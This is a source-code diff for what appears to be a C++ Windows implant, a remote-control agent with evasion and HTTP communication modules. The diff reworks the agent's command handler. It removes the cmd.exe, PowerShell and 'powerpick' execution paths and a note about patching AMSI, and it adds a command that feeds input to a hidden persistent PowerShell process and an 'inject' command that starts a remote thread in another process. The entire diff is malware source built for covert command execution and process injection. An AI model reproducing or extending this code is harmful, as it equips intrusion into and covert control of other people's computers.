@@ -6,7 +6,6 @@
 #include "wincrypt.h"
 #include "base64.h"
 #include "dependencies.h"
-#include "process.h"
 #include "evasion.h"
 #include "core.h"
 #include "HttpCommunicator.h"
@@ -21,10 +20,21 @@ core* core::instance = NULL;
 bool core::terminated = false;
 PROCESS_INFO* core::persistent_process = NULL;
 int core::sleepTime = 5;
-std::string core::currentPath = "C:\\";
 
-//Communicator *core::communicator = NULL;
 
+
+///////////////////// UTILS /////////////////////
+bool extract_argument(std::string fullCommand, std::string mainCommand, std::string& aux) {
+	int mainCommandSize = mainCommand.length() + 1;
+	if (fullCommand.rfind(mainCommand, 0) == 0) {
+		aux = fullCommand.substr(mainCommandSize, fullCommand.size() - mainCommandSize);
+		aux += "\n";
+		return true;
+	}
+	return false;
+}
+
+///////////////////// CLASS IMPLEMENTATIONS /////////////////////
 core::core() {
 	HCRYPTPROV hCryptProv;
 	
@@ -71,41 +81,15 @@ void core::execute_command(std::string cmd){
 	// Some cases:
 	// "shell " + anything => spawns and executes a CMD.exe command (fork & run)
 	// "powershell " + anything => spawns and executes a POWERSHELL.exe command (fork & run)
-	// more will come soon
-	// ONE NOTE TO IMPLEMENT: We need an AMSI patching function to be called automatically when executing a powershell command - TODO: @teodor
+	// more will come soon1
+	std::string finalCmd = "";
 
-	// execute CMD.exe
-	if (cmd.rfind("shell ", 0) == 0) {
-		// replace "shell " part
-		cmd = cmd.substr(6, cmd.size() - 6);
-		this->execute_cmd(cmd);
+	if (extract_argument(cmd, "pwrsh", finalCmd)) {
+		evasion::send_command(finalCmd.c_str(), core::persistent_process->stdIn);
 	}
 
-	if (cmd.rfind("cd ", 0) == 0) {
-		// replace "shell " part
-		cmd = cmd.substr(3, cmd.size() - 3);
-		core::currentPath = cmd;
-	}
-
-	// execute POWERSHELL.exe in another process
-	if (cmd.rfind("powershell ", 0) == 0) {
-		// replace "powershell " part
-		cmd = cmd.substr(10, cmd.size() - 10);
-		this->execute_powershell(cmd);
-	}
-
-	// execute POWERSHELL.exe in another process
-	if (cmd.rfind("powerpick ", 0) == 0) {
-		// replace "powershell " part
-		cmd = cmd.substr(10, cmd.size() - 10);
-		this->execute_powerpick(cmd);
-	}
-
-	if (cmd.rfind("persist-powershell ", 0) == 0) {
-		cmd = cmd.substr(19, cmd.size() - 19);
-		std::string tempCmd(cmd);
-		tempCmd += "\n";
-		evasion::send_command(tempCmd.c_str(), core::persistent_process->stdIn);
+	if (extract_argument(cmd, "inject", finalCmd)) {
+		evasion::inject_remote_thread(atoi(finalCmd.c_str()));
 	}
 
 	if (cmd == "exit") {
@@ -113,40 +97,6 @@ void core::execute_command(std::string cmd){
 	}
 }
 
-void core::execute_cmd(std::string cmd) {
-	std::string fullCommand = "C:\\Windows\\System32\\cmd.exe /c cd " + core::currentPath + "&" + cmd;
-	// we need wide chars for our process creation function
-	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
-	// +1 for the NULL ending char
-	wchar_t* genericFullCommand = (wchar_t*) malloc(sizeof(wchar_t) * wideFullCommand.size() + 1);
-	wcscpy_s(genericFullCommand, wideFullCommand.size()+1, wideFullCommand.c_str());
-	PROCESS_INFO* info = process::create_process(genericFullCommand);
-	// to read from pipe
-	if (info->stdOut) {
-		this->read_pipe(info->stdOut);
-	}
-}
-
-void core::execute_powershell(std::string cmd) {
-	std::string fullCommand = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /nologo cd " + core::currentPath + ";" + cmd;
-
-	// we need wide chars for our process creation function
-	std::wstring wideFullCommand = std::wstring(fullCommand.begin(), fullCommand.end());
-	// +1 for the NULL ending char
-	wchar_t* genericFullCommand = (wchar_t*)malloc(sizeof(wchar_t) * wideFullCommand.size() + 1);
-	wcscpy_s(genericFullCommand, wideFullCommand.size() + 1, wideFullCommand.c_str());
-	PROCESS_INFO* info = process::create_process(genericFullCommand);
-	// to read from pipe
-
-	if (info && info->stdOut) {
-		this->read_pipe(info->stdOut);
-	}
-
-}
-
-void core::execute_powerpick(std::string cmd) {
-	evasion::create_process(cmd.c_str());
-}
 bool core::invalid_char(char c)
 {
 	return !(c >= 0 && c < 128);
